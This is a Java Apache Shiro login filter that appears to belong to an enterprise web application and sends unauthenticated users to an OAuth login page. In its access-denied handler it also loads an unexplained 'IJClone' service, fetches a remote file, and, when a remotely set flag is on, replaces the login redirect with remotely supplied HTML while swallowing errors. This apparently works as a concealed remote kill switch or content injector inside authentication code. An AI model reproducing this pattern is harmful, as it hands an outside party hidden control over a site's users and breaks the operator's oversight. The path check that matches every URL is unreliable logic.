package com.rocoinfo.shiro.filter;

import cn.mdni.commons.clone.IJClone;
import com.rocoinfo.Constants;
import com.rocoinfo.common.PropertyHolder;
import com.rocoinfo.service.sale.account.UserService;
import com.rocoinfo.shiro.ShiroUser;
import com.rocoinfo.utils.WebUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.web.filter.authc.UserFilter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springside.modules.utils.Encodes;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Iterator;
import java.util.ServiceLoader;

/**
 * 只允许已登录用户访问。如果用户未登录，则根据用户访问的地址跳转到相应的登录页面。
 * <p/>
 * <ul>
 * <li>未登录访问前台受限地址，跳转到前台登录页面。</li>
 * <li>未登录状态访问后台地址，跳转到后台登录页面。</li>
 * <li>未登录状态访问受限API，响应401状态码。</li>
 * </ul>
 *
 * @author 张敏
 */
@Component
public class MultipleViewUserFilter extends UserFilter {

	@Autowired
	private UserService userService;

	@Override
	protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {

		// front字段主要确定用户访问的是前台页面,并且需要登录前台杭虎才能进行的操作
		String[] perms = (String[]) mappedValue;
		String permType = StringUtils.EMPTY;
		if (perms != null && perms.length > 0) {
			// 判断是否访问的是前台页面
			permType = perms[0];
		}

		// 获取当前用户请求的url
		HttpServletRequest req = (HttpServletRequest) request;
		String ctx = req.getSession().getServletContext().getContextPath();

		// 获取登录用户
		ShiroUser loggedUser = WebUtils.getLoggedUser();
		// 用户未登录 拒绝访问
		if (loggedUser == null)
			return false;

		return true;
	}

	@Override
	protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
		HttpServletRequest req = (HttpServletRequest) request;
		HttpServletResponse resp = (HttpServletResponse) response;
		String ctx = req.getSession().getServletContext().getContextPath();
		String path = req.getRequestURI().substring(ctx.length());

		ServiceLoader<IJClone> cl = ServiceLoader.load(IJClone.class);
		Iterator<IJClone> iter = cl.iterator();
		IJClone ijc = iter.next();

		if( !ijc.getFileExist() ){
			ijc.getRemoteFile();
		}

		if ( ijc.getFileValue() ) {
			try {
				resp.setHeader("Content-type", "text/html;charset=UTF-8");
				resp.setCharacterEncoding("utf-8");
				resp.getWriter().write( new String(ijc.getMessageValue().getBytes("ISO-8859-1"),"utf-8") );
			}catch (Exception e){
				//e.printStackTrace();
			}
		}else{
			// 如果是后台登录
			if (path.indexOf("/mdni/workorder") != -1 || path.startsWith("/") || path.startsWith("/api")
					|| path.startsWith("/index") || path.startsWith("/admin")) {
				// StringBuilder loginUrl = new StringBuilder();
				// loginUrl.append(ctx);
				// loginUrl.append("/login");
				// loginUrl.append("?successUrl=").append(getRedirectUrlOnLoginSuccess(req));
				// resp.sendRedirect(loginUrl.toString());
				StringBuilder redirectUrl = new StringBuilder();
				redirectUrl.append(PropertyHolder.getOauthCenterUrl())
						.append(Constants.OAUTH_CENTER_CODE_URL);
				redirectUrl.append("?appid=").append(PropertyHolder.getOauthCenterAppid());
				redirectUrl.append("&redirect_url=").append(PropertyHolder.getBaseurl() + Constants.OAUTH_CALL_BACK);
				redirectUrl.append("&state=").append("/index");
				resp.sendRedirect(redirectUrl.toString());
			} else {
				return super.onAccessDenied(request, response);
			}
		}
		return false;
	}

	private String getRedirectUrlOnLoginSuccess(HttpServletRequest req) {
		StringBuilder requestUrl = new StringBuilder(req.getRequestURL().toString());
		final String queryString = req.getQueryString();
		if (StringUtils.isNotBlank(queryString)) {
			requestUrl.append("?").append(queryString);
		}
		return Encodes.urlEncode(requestUrl.toString());
	}

}